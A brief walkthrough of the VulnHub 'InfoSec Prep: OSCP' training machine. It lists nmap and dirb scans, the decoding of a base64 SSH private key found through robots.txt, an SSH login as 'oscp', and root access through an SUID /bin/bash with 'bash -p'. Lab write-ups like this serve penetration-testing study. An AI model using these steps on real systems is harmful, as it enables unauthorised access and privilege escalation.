

# InfoSec Prep:OSCP Walkthrough 


**VulnHub Link:** [InfoSec Prep:OSCP](https://www.vulnhub.com/entry/infosec-prep-oscp,508/)
**Difficulty:** Easy
**Release Date:** 11 Jul 2020


## 1.Reconnaissance

nmap -A -O -T4 -P -sV 192.168.100.143


## 2.Web Enumeration


dirb http://192.168.100.143

from http://192.168.100.143/robots.txt --> we get secret.txt

we download that file and ---> cat secret.txt | base64 -d

we obtain ssh private key and write to id_rsa

from web page , we found out user is 'oscp'


ssh oscp@192.168.100.143 -i id_rsa

## 3.Privilege Escalation

oscp shell opened and strangly /bin/bash has suid byte 

/bin/bash -p

we cat read flag.txt
